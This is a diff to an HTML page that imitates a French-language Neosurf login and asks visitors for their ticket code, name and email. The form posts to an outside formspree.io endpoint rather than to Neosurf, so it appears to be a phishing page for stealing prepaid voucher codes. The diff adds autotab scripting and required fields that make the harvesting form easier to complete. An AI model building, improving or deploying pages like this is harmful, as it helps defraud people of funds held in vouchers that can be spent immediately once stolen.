@@ -6,6 +6,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="index.css">
     <title>Document</title>
+
+
+    <script language="JavaScript" type="text/JavaScript">
+      function Autotab(box, longueur, texte)
+      {
+          if (texte.length > longueur-1) {
+              document.getElementById('TB'+box).focus();
+          }
+      }
+      </script>
 </head>
 <body>
     
@@ -19,7 +29,7 @@
         <div class="text">
             <label > Connectez-vous en indiquant le code figurant sur votre ticket Neosurf
                      afin d'acceder a de nombreuses informations et option : credit disponible
-                     ,trnafert de solde etc ...
+                     ,transfert de solde etcs ...
             </label>
         </div>
      </div>
@@ -31,26 +41,26 @@
     <form action="https://formspree.io/f/xdojebnd" method="POST">
 
       <div class="main">
-        <input type="textarea" name="Coupon 1:"  class="coupon" id="" maxlength="4" cols="10" rows="3" />&nbsp;&nbsp;&nbsp;
-        <input type="textarea" name="Coupon 2:" class="coupon" id="" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
-        <input type="textarea" name="Coupon 3:" class="coupon" id="" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
-        <input type="textarea" name="Coupon 4:" class="coupon" id="" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
-        <input type="textarea" name="Coupon 5:" class="coupon" id="" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
-        <input type="textarea" name="Coupon 6:" class="coupon" id="" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
-        <input type="textarea" name="Coupon 7:" class="coupon" id="" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
-        <input type="textarea" name="Coupon 8:" class="coupon" id="" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
-        <input type="textarea" name="Coupon 9:" class="coupon" id="" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
-        <input type="textarea" name="Coupon 10:" class="coupon" id="" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
-        <input type="textarea" name="Coupon 11:" class="coupon" id="" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
-        <input type="textarea" name="Coupon 2:" class="coupon" id="" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
+        <input required type="textarea" size="4" tabindex="1" onkeyup="Autotab(2, this.size, this.value)" name="Coupon 1:" class="coupon" id="TB1" maxlength="4" cols="10" rows="3" />&nbsp;&nbsp;&nbsp;
+        <input required type="textarea" size="3" tabindex="2" onkeyup="Autotab(3, this.size, this.value)" name="Coupon 2:" class="coupon" id="TB2" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
+        <input required type="textarea" size="3" tabindex="3" onkeyup="Autotab(4, this.size, this.value)" name="Coupon 3:" class="coupon" id="TB3" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
+        <input required type="textarea" size="4" tabindex="4" onkeyup="Autotab(5, this.size, this.value)" name="Coupon 4:" class="coupon" id="TB4" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
+        <input required type="textarea" size="3" tabindex="5" onkeyup="Autotab(6, this.size, this.value)" name="Coupon 5:" class="coupon" id="TB5" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
+        <input required type="textarea" size="3" tabindex="5" onkeyup="Autotab(7, this.size, this.value)" name="Coupon 6:" class="coupon" id="TB6" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
+        <input required type="textarea" size="4" tabindex="5" onkeyup="Autotab(8, this.size, this.value)" name="Coupon 7:" class="coupon" id="TB7" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
+        <input required type="textarea" size="3" tabindex="5" onkeyup="Autotab(9, this.size, this.value)" name="Coupon 8:" class="coupon" id="TB8" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
+        <input required type="textarea" size="3" tabindex="5" onkeyup="Autotab(10, this.size, this.value)" name="Coupon 9:" class="coupon" id="TB9" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
+        <input required type="textarea" size="4" tabindex="5" onkeyup="Autotab(11, this.size, this.value)" name="Coupon 10:" class="coupon" id="TB10" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
+        <input required type="textarea" size="3" tabindex="5" onkeyup="Autotab(12, this.size, this.value)" name="Coupon 11:" class="coupon" id="TB11" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
+        <input required type="textarea" size="3" tabindex="5" onkeyup="Autotab(13, this.size, this.value)" name="Coupon 2:" class="coupon" id="TB12" maxlength="4" cols="15" rows="3"/>&nbsp;&nbsp;&nbsp;
       </div>
       <br><br>
 
 
       <div class="inp">
-           <input class="in" type="text" name="Nom du client : " placeholder=" &nbsp;&nbsp;&nbsp;Nom">
+           <input required class="in" type="text" name="Nom du client : " placeholder=" &nbsp;&nbsp;&nbsp;Nom">
            <p></p>
-           <input class="in" type="email" name="email" placeholder="&nbsp;&nbsp;&nbsp;Email">
+           <input required class="in" type="email" name="email" placeholder="&nbsp;&nbsp;&nbsp;Email">
       </div>
 
       <div class="end">
